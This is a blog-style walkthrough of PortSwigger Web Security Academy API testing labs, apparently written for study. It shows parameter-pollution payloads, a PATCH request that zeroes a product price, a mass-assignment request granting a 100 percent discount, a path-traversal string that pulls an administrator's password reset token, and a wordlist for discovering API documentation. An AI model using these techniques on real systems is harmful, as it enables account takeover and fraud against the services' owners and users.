---
layout: single
title: API testing - PortSwigger
excerpt: "All API testing labs of PortSwigger."
date: 2025-10-04
classes: wide
header:
  teaser: /img2/images/portswigger.png
  teaser_home_page: true
  icon: /img2/images/burp.jpg
categories:
  - portswigger
  - Web
tags:
  - Burpsuite
  - API
---


## TIPS

- Parameter Pollution

```http
- DETECT PARAMETER POLLUTION-

username=administrator%26testing   -> URL-Encode &

- COMMENT QUERY -
  
username=administrator%23     -> URL-Encode #

- FIND HIDDEN PARAMETERS -
  
username=administrator%26field=FUZZ%23   -> Send to Intruder (Server-side variables name)

- GET RESET TOKEN -
  
username=administrator%26field=reset_token%23   -> Find reset_token parameter in JS file
```

- Hidden method `Change METHOD`

```http
PATCH /api/products/1/price HTTP/2

Content-Type: application/json
Content-Length: 22

{
	"price" : 0
}
```

- Mass-Assigment

```http
- VIEW OBJECT -

GET /api/checkout
```
```json
{
    "chosen_discount":{
        "percentage":0
    },
    "chosen_products":[
        {
            "product_id":"1",
            "quantity":1
        }
    ]
}
```

```http
- MASS ASSIGMENT -

POST /api/checkout
Content-Type: application/json

{
    "chosen_discount":{
        "percentage":100
    },
    "chosen_products":[
        {
            "product_id":"1",
            "quantity":1
        }
    ]
}
```

- Path Traversal

```http
POST /forgot-password


username=administrator/../../../../../openapi.json#
```

## Explotación de un endpoint usando la documentación || Exploiting an API endpoint using documentation

```bash
❯ gobuster dir -u https://0afa00be03681a5d82c915b40010002e.web-security-academy.net/ -w BSCP/burp-paths.txt -t 20 --follow-redirect
```

```ruby
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://0afa00be03681a5d82c915b40010002e.web-security-academy.net/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                BSCP/burp-paths.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/api                  (Status: 200) [Size: 3315]
/logout               (Status: 200) [Size: 10624]
/resources/images/tracker.gif (Status: 200) [Size: 42]
/my-account           (Status: 200) [Size: 3172]
/login                (Status: 200) [Size: 3172]
/filter               (Status: 200) [Size: 10722]
/product              (Status: 400) [Size: 30]
Progress: 279 / 280 (99.64%)
===============================================================
Finished
===============================================================
```

> We do directory fuzzing and find the /api directory.

![](/img2/Pasted%20image%2020251001214841.png)

> Inside the /api directory there is documentation for all API endpoints.

![](/img2/Pasted%20image%2020251001214937.png)

## Parameter pollution en query string del servidor || Exploiting server-side parameter pollution in a query string

![](/img2/Pasted%20image%2020251001222352.png)

![](/img2/Pasted%20image%2020251001222520.png)

> We detect parameter pollution by injecting a new parameter by URL-encoding the &.

![](/img2/Pasted%20image%2020251001222909.png)

> Following the same idea of injecting parameters via URL-encoding, we can inject a # so we comment out the rest of the query. This reveals a hidden field parameter.

![](/img2/Pasted%20image%2020251001223239.png)

> We insert the discovered field parameter by injection with URL-encoding and confirm the server interprets it.

![](/img2/Pasted%20image%2020251001223541.png)

> We add a Burp Suite dictionary Server-side variables name.

![](/img2/Pasted%20image%2020251001224005.png)

> Thanks to this we reveal that the field parameter shows which field is displayed in the response.

![](/img2/Pasted%20image%2020251001224935.png)

> If we check the JavaScript file executed for the password change request we see there is a parameter with the password reset token.

![](/img2/Pasted%20image%2020251001225442.png)

![](/img2/Pasted%20image%2020251001225631.png)


## Descubrimiento y explotación de un endpoint no usado || Finding and exploiting an unused API endpoint

![](/img2/Pasted%20image%2020251002103927.png)

> When reviewing the requests made when adding a product to the cart we notice a request to an endpoint whose function is to check the product price.

![](/img2/Pasted%20image%2020251002104121.png)

> To see which methods are valid for the same endpoint we can change the request method. In the response we see the allowed methods, among them PATCH which updates the object.

![](/img2/Pasted%20image%2020251002104348.png)

> We add a JSON body with the price to update.

![](/img2/Pasted%20image%2020251002104504.png)

## Explotación de Mass Assignment || Exploiting a mass assignment vulnerability

![](/img2/Pasted%20image%2020251002110200.png)

> We detect an endpoint when placing the order that checks the products in the cart.

![](/img2/Pasted%20image%2020251002110515.png)

> We also find another method for the same endpoint which creates the order indicating the chosen product and quantity.

![](/img2/Pasted%20image%2020251002110341.png)

> We add the response obtained with the GET method and try changing the parameters. We manage to modify the percentage parameter. In this way we achieve a mass-assignment.

## Parameter pollution en URL REST del servidor || Exploiting server-side parameter pollution in a REST URL

![](/img2/Pasted%20image%2020251003112920.png)

![](/img2/Pasted%20image%2020251003112948.png)

> We detect a Path Traversal in the username field.

![](/img2/Pasted%20image%2020251003113100.png)

> We also see that we can comment out the rest of the query that is executed behind the scenes using a #.

![](/img2/Pasted%20image%2020251003113349.png)

```
/swagger-ui.html
/swagger-ui/
/swagger-ui/index.html
/api-docs
/v2/api-docs
/v3/api-docs
/swagger.json
/openapi.json
/api/swagger.json
/docs
/api-docs/
/swagger/
/swagger/index.html
/swagger/v1/swagger.json
/swagger/v2/swagger.json
/swagger/v3/swagger.json
/openapi/
/openapi/v1/
/openapi/v2/
/openapi/v3/
/api/v1/swagger.json
/api/v2/swagger.json
/api/v3/swagger.json
/documentation
/documentation/swagger
/documentation/openapi
/swagger/docs/v1
/swagger/docs/v2
/swagger/docs/v3
/swagger-ui.html#/
/swagger-ui/index.html#/
/openapi/ui
/swagger-ui/v1/
/swagger-ui/v2/
/swagger-ui/v3/
/api/swagger-ui.html
/api/swagger-ui/
/api/documentation
/v1/documentation
/v2/documentation
/v3/documentation
/swagger-resources
/swagger-resources/configuration/ui
/swagger-resources/configuration/security
/swagger-resources/swagger.json
/swagger-resources/openapi.json
/swagger-ui/swagger-ui.html
/swagger-ui/swagger-ui/
/swagger-ui.html/swagger-resources
/swagger-ui.html/swagger-resources/configuration/ui
/swagger-ui.html/swagger-resources/configuration/security
/api/swagger-resources
/api/swagger-resources/configuration/ui
/api/swagger-resources/configuration/security
/api/swagger-resources/swagger.json
/api/swagger-resources/openapi.json
/swagger/v1/
/swagger/v2/
/swagger/v3/
/swagger-ui/v1/swagger.json
/swagger-ui/v2/swagger.json
/swagger-ui/v3/swagger.json
/api/swagger-ui/v1/
/api/swagger-ui/v2/
/api/swagger-ui/v3/
/openapi/swagger.json
/openapi/openapi.json
/api/openapi
/api/openapi.json
/api/v1/openapi.json
/api/v2/openapi.json
/api/v3/openapi.json
/swagger.yaml
/openapi.yaml
/swagger.yml
/openapi.yml
/v1/swagger.yaml
/v2/swagger.yaml
/v3/swagger.yaml
/v1/openapi.yaml
/v2/openapi.yaml
/v3/openapi.yaml
/swagger/api
/openapi/api
/swagger/api-docs
/openapi/api-docs
/swagger/api/swagger.json
/openapi/api/openapi.json
/swagger/api/v1/swagger.json
/swagger/api/v2/swagger.json
/swagger/api/v3/swagger.json
/openapi/api/v1/openapi.json
/openapi/api/v2/openapi.json
/openapi/api/v3/openapi.json
/swagger/api/swagger.yaml
/swagger/api/swagger.yml
/openapi/api/openapi.yaml
/openapi/api/openapi.yml
```

![](/img2/Pasted%20image%2020251003113330.png)

> Using Intruder we fuzz common API directories. We find that openapi.json leaks the internal endpoint that is executed behind the scenes /api/internal/v1/users/{username}/field/{field}.

![](/img2/Pasted%20image%2020251003113701.png)

![](/img2/Pasted%20image%2020251003113728.png)

> Using path traversal we point to the internal endpoint revealed, specifying another field in field. We know this field thanks to the JS file executed during the password change process. Behind the scenes the query would look like this:

```python
/api/internal/v1/users/administrator/../../../../../../../../api/internal/v1/users/administrator/field/passwordResetToken#/field/email
```

![](/img2/Pasted%20image%2020251003114120.png)